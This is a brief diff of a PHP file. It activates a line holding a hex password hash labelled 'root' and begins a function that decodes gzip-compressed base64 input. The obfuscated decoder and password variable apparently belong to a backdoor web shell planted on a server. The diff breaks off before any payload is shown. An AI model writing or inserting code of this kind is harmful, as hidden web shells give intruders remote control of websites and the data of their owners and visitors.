@@ -1,5 +1,5 @@
 <?php
-//$▛ = "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; //root 
+$▛ = "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; //root 
 function deqtS($kEDQ)
 { 
 $kEDQ=gzinflate(base64_decode($kEDQ));
